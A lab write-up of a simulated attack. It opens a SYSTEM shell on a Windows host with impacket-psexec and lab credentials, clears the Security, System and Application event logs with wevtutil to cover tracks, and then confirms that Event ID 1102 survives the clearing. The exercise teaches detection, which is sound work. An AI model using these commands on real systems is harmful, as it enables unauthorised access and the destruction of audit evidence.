# 02 — Attack Simulation (Kali, 192.168.100.106 / BUTCH)

## Step 1 — Foothold: SYSTEM shell via psexec

```bash
impacket-psexec adminlab:'P@ssw0rd'@192.168.100.108
```
Result: v0.14.0 — found writable ADMIN$, uploaded `QjDJVASl.exe`, opened SVCManager, created/started service `OJKp` → `C:\Windows\system32>` shell as SYSTEM. Windows 10.0.19045.2846.
📸 `evidence/01-kali-psexec-shell.png`

## Step 2 — Clear all three main logs (cover tracks)

```cmd
wevtutil cl Security
wevtutil cl System
wevtutil cl Application
```
(No output = success. `cl` = clear-log. One earlier typo'd channel gave "The specified channel could not be found" — the three correct commands all succeeded.)
📸 `evidence/02-kali-wevtutil-clear-logs.png`

## Step 3 — Verify the Security log was cleared

```cmd
wevtutil gli Security
```
→ `creationTime: 2026-10-30T16:47:52.545Z`, `lastWriteTime: 2026-10-31T16:48:03.951Z`, `fileSize: 69632`, **`numberOfLogRecords: 17`**, **`oldestRecordNumber: 1`**. Record numbering restarted at 1 and only 17 records remain (all post-clear) — clear confirmed.
📸 `evidence/03-kali-verify-cleared.png`

## Step 4 — Confirm Event ID 1102 exists (the event that survives)

```powershell
powershell -c "Get-WinEvent -FilterHashtable @{LogName='Security'; Id=1102} -MaxEvents 1 | Format-List Id,TimeCreated,Message"
```
→ **Id: 1102**, TimeCreated: 10/31/2026 9:45:56 AM, Message: **"The audit log was cleared."** Subject: Security ID `S-1-5-18`, Account Name `SYSTEM`, Domain `NT AUTHORITY`, Logon ID `0x3E7`.
📸 `evidence/04-kali-1102-confirmed.png`

## Step 5 — (No cleanup needed — logs already cleared; this is the end state)
